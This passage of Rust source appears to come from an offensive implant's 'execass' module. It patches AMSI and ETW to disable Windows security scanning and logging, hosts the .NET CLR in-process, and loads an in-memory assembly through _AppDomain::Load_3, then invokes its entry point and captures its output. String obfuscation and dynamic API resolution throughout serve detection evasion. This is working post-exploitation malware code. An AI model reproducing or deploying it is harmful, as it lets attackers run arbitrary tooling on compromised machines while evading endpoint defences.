            return Err(crate::ob!("SafeArrayPutElement failed").to_string());
        }
        Ok(())
    }

    unsafe fn sys_alloc_string(value: &str) -> Raw {
        let alloc: unsafe extern "system" fn(*const u16) -> Raw =
            std::mem::transmute(resolve(&crate::ob!("oleaut32.dll"), &crate::ob!("SysAllocString")).unwrap());
        let wide_value = wide(value);
        alloc(wide_value.as_ptr())
    }

    unsafe fn safe_array_destroy(array: Raw) {
        if array.is_null() {
            return;
        }
        if let Ok(destroy) = resolve(&crate::ob!("oleaut32.dll"), &crate::ob!("SafeArrayDestroy")) {
            let func: unsafe extern "system" fn(Raw) -> Hresult = std::mem::transmute(destroy);
            func(array);
        }
    }

    unsafe fn byte_array_to_safe_array(bytes: &[u8]) -> Result<Raw, String> {
        let array = safe_array_create_vector(VT_UI1, bytes.len() as u32)?;
        let access: unsafe extern "system" fn(Raw, *mut *mut c_void) -> Hresult =
            std::mem::transmute(resolve(&crate::ob!("oleaut32.dll"), &crate::ob!("SafeArrayAccessData"))?);
        let mut data: *mut c_void = std::ptr::null_mut();
        if access(array, &mut data) != 0 {
            safe_array_destroy(array);
            return Err(crate::ob!("SafeArrayAccessData failed").to_string());
        }
        std::ptr::copy_nonoverlapping(bytes.as_ptr(), data as *mut u8, bytes.len());
        let unaccess: unsafe extern "system" fn(Raw) -> Hresult =
            std::mem::transmute(resolve(&crate::ob!("oleaut32.dll"), &crate::ob!("SafeArrayUnaccessData")).unwrap());
        unaccess(array);
        Ok(array)
    }

    unsafe fn prepare_parameters(params: &[String]) -> Result<Raw, String> {
        let string_array = safe_array_create_vector(VT_BSTR, params.len() as u32)?;
        for (index, param) in params.iter().enumerate() {
            let bstr = sys_alloc_string(param);
            if let Err(error) = safe_array_put_element(string_array, index as i32, bstr) {
                safe_array_destroy(string_array);
                return Err(error);
            }
        }
        let mut param_variant = Variant {
            vt: VT_BSTR | VT_ARRAY,
            reserved: [0; 3],
            value: string_array as usize,
            extra: [0; 8],
        };
        let outer = safe_array_create_vector(VT_VARIANT, 1)?;
        if let Err(error) = safe_array_put_element(outer, 0, &mut param_variant as *mut Variant as *mut c_void) {
            safe_array_destroy(outer);
            safe_array_destroy(string_array);
            return Err(error);
        }
        Ok(outer)
    }

    unsafe fn drain_buffers() -> (String, String) {
        std::thread::sleep(std::time::Duration::from_millis(1));
        let stdout = STDOUT_BUFFER
            .as_ref()
            .and_then(|buffer| buffer.lock().ok())
            .map(|mut guard| String::from_utf8_lossy(&guard).into_owned())
            .unwrap_or_default();
        if let Some(buffer) = STDOUT_BUFFER.as_ref() {
            if let Ok(mut guard) = buffer.lock() {
                guard.clear();
            }
        }
        let stderr = STDERR_BUFFER
            .as_ref()
            .and_then(|buffer| buffer.lock().ok())
            .map(|mut guard| String::from_utf8_lossy(&guard).into_owned())
            .unwrap_or_default();
        if let Some(buffer) = STDERR_BUFFER.as_ref() {
            if let Ok(mut guard) = buffer.lock() {
                guard.clear();
            }
        }
        (stdout, stderr)
    }

    fn step(debug: bool, message: &str) {
        if debug {
            super::clr::write_orig(&format!("{} {}\n", crate::ob!("[INF]"), message));
        }
    }

    fn hr_text(hr: i32) -> String {
        format!("0x{:08x}", hr as u32)
    }

    pub fn invoke_in_process(request: &super::Request, parsed_args: &[String]) -> (String, String) {
        unsafe {
            let dbg = request.debug;
            step(dbg, &crate::ob!("patching amsi/etw").to_string());
            if std::env::var_os("FURY_NO_AMSI_PATCH").is_none() {
                if let Err(error) = patch_amsi_etw(request.debug) {
                    return (String::new(), format!("{}{}", crate::ob!("failed to load CLR: "), error));
                }
                step(dbg, &crate::ob!("amsi/etw patched").to_string());
            } else {
                step(dbg, "amsi patch SKIPPED");
            }
            step(dbg, &crate::ob!("loading clr").to_string());
            let state = match load_clr(&request.runtime) {
                Ok(state) => state,
                Err(error) => return (String::new(), format!("{}{}", crate::ob!("failed to load CLR: "), error)),
            };
            step(dbg, &crate::ob!("clr loaded").to_string());
            if STDOUT_WRITE.is_null() {
                step(dbg, &crate::ob!("redirecting output").to_string());
                if let Err(error) = redirect_output() {
                    return (String::new(), error);
                }
                step(dbg, &crate::ob!("output redirected").to_string());
            }

            // ICorRuntimeHost::GetDefaultDomain (slot 13) -> _AppDomain.
            let get_default_domain: unsafe extern "system" fn(Raw, *mut Raw) -> Hresult =
                std::mem::transmute::<Raw, _>(slot(state.host, 13));
            let mut app_domain: Raw = std::ptr::null_mut();
            let hr = get_default_domain(state.host, &mut app_domain);
            step(dbg, &format!("GetDefaultDomain hr={}", hr_text(hr)));
            if hr != 0 || app_domain.is_null() {
                return (String::new(), crate::ob!("failed to get the default app domain").to_string());
            }

            // GetDefaultDomain yields an IUnknown; QueryInterface it to the
            // _AppDomain dispatch interface before using its vtable slots
            // (go-clr does the same, otherwise Load_3 faults inside clr.dll).
            let query_interface: unsafe extern "system" fn(Raw, *const Guid, *mut Raw) -> Hresult =
                std::mem::transmute::<Raw, _>(slot(app_domain, 0));
            let mut domain: Raw = std::ptr::null_mut();
            let hr = query_interface(app_domain, &IID_APP_DOMAIN, &mut domain);
            step(dbg, &format!("QueryInterface(_AppDomain) hr={}", hr_text(hr)));
            if hr != 0 || domain.is_null() {
                return (String::new(), crate::ob!("failed to get the _AppDomain interface").to_string());
            }
            app_domain = domain;

            step(dbg, &format!("artifact len={}", request.artifact.len()));
            let raw_array = match byte_array_to_safe_array(&request.artifact) {
                Ok(array) => array,
                Err(error) => return (String::new(), error),
            };
            step(dbg, "safearray created");
            // _AppDomain::Load_3 (slot 45) -> Assembly.
            step(dbg, "calling Load_3");
            let load_3: unsafe extern "system" fn(Raw, Raw, *mut Raw) -> Hresult =
                std::mem::transmute::<Raw, _>(slot(app_domain, 45));
            let mut assembly: Raw = std::ptr::null_mut();
            let hr = load_3(app_domain, raw_array, &mut assembly);
            step(dbg, &format!("Load_3 hr={}", hr_text(hr)));
            safe_array_destroy(raw_array);
            if hr != 0 || assembly.is_null() {
                return (String::new(), crate::ob!("failed to load assembly").to_string());
            }

            // _Assembly::GetEntryPoint (slot 16) -> MethodInfo.
            let get_entry_point: unsafe extern "system" fn(Raw, *mut Raw) -> Hresult =
                std::mem::transmute::<Raw, _>(slot(assembly, 16));
            let mut method_info: Raw = std::ptr::null_mut();
            let hr = get_entry_point(assembly, &mut method_info);
            step(dbg, &format!("GetEntryPoint hr={}", hr_text(hr)));
            if hr != 0 || method_info.is_null() {
                return (String::new(), crate::ob!("failed to get the assembly entry point").to_string());
            }

            // MethodInfo::get_ToString (slot 7) for the signature check.
            let to_string: unsafe extern "system" fn(Raw, *mut *const u16) -> Hresult =
                std::mem::transmute::<Raw, _>(slot(method_info, 7));
            let mut signature_ptr: *const u16 = std::ptr::null();
            let mut signature = String::new();
            let hr = to_string(method_info, &mut signature_ptr);
            if hr == 0 {
                signature = read_wide(signature_ptr);
                step(dbg, &format!("sig={}", signature));
            } else {
                step(dbg, &format!("ToString hr={}", hr_text(hr)));
            }

            let mut param_array: Raw = std::ptr::null_mut();
            if !signature.contains("Void Main()") {
                if let Ok(array) = prepare_parameters(parsed_args) {
                    param_array = array;
                }
            }

            let null_variant = Variant {
                vt: 1, // VT_NULL, matching go-clr
                reserved: [0; 3],
                value: 0,
                extra: [0; 8],
            };
            // MethodInfo::Invoke_3 (slot 37).
            let invoke_3: unsafe extern "system" fn(Raw, Variant, Raw) -> Hresult =
                std::mem::transmute::<Raw, _>(slot(method_info, 37));
            let hr = invoke_3(method_info, null_variant, param_array);
            step(dbg, &format!("Invoke_3 hr={}", hr_text(hr)));
            let mut invoke_error = String::new();
            if hr != 0 {
                invoke_error = crate::ob!("the MethodInfo::Invoke_3 method returned an error").to_string();
            }
            safe_array_destroy(param_array);

            let (stdout, stderr) = drain_buffers();
            (stdout, format!("{}{}", stderr, invoke_error))
        }
    }
}

#[cfg(not(target_os = "windows"))]
pub use unsupported::run_helper;

#[cfg(not(target_os = "windows"))]
mod unsupported {
    pub fn run_helper() -> i32 {
        eprintln!("{}", crate::ob!("execass is unsupported on this platform"));
        1
    }
}
